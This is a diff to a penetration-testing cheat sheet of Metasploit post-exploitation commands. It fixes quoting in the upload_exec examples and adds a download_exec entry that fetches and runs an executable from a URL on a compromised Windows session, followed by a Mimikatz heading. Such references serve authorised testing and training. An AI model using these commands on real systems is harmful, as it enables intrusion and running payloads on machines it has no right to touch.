@@ -323,15 +323,22 @@ run -o SESSION=<1>,URIPATH=<random>
 ```ruby
 use post/multi/manage/upload_exec
 set session <1>
-set LPATH <'path_to_local_file'>
-set RPATH <'path_to_remote_file'>
-set ARGS <'args'>
+set LPATH '<path_to_local_file>'
+set RPATH '<path_to_remote_file>'
+set ARGS '<args>'
 ```
 
 ## Run
 ```ruby
 use post/multi/manage/upload_exec
-run -o LPATH=<'path_to_local_file'>,RPATH=<'path_to_remote_file'>,SESSION=<1>
+run -o LPATH='<path_to_local_file>',RPATH='<path_to_remote_file>',SESSION=<1>
+```
+
+# Download and/or execute
+## Run
+```ruby
+use post/windows/manage/download_exec
+run SESSION=2,URL='<url_to_exe>',EXECUTE=<true>
 ```
 
 # Mimikatz
